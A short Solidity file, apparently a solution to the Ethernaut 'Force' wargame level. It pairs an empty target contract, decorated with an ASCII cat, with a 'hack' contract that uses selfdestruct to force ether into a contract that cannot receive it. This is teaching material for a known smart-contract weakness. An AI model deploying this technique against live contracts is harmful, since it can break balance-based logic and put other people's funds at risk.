// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract hack {

    receive() external payable {}

    function destruct(address payable _send) public {
        selfdestruct(_send);
    }
}